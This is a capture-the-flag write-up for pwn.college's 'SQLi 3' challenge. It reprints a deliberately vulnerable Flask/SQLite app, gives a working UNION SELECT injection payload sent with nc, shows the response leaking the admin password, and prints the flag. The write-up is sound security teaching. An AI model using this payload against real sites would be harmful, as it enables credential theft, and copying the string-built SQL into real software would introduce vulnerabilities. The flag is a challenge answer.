---
layout: page
title: "SQLi 3 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this SQL injection challenge, you're given a Flask-based Python web app using an SQLite database. The goal is to extract the flag stored in the password field of the `admin` user by exploiting a SQL injection vulnerability.

---

## 🧾 Source Code Analysis

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

import sqlite3
import tempfile

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
db.execute(f"""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:
        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
---

## Vulnerability
The query string is directly inserted into a SQL query without sanitization:
```bash
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```
This is a classic SQL injection vector.

---

## Exploitation
You can use a UNION SELECT to leak the password (which is actually the flag) from the users table:
```bash
hacker@web-security~sqli-3:~$ printf 'GET /?query=admin"+union+select+password+from+users+-- HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n' | nc challenge.localhost 80
```

### Response
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Sun, 20 Jul 2025 09:33:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 478
Connection: close

<html><body>Welcome to the user query service!
<form>Query:<input type=text name=query value='admin" union select password from users --'><input type=submit value=Submit></form>
<hr>
<b>Query:</b> <pre>SELECT username FROM users WHERE username LIKE "admin" union select password from users --"</pre><br>
<b>Results:</b><pre>admin
password
pwn.college{MB8yC9OqFLMe2Am4mFwR58I5_vs.QXxkzMzwSM0IzMyEzW}
</pre>
</body></html>
```

--- 

## Flag

```
pwn.college{MB8yC9OqFLMe2Am4mFwR58I5_vs.QXxkzMzwSM0IzMyEzW}
```

---

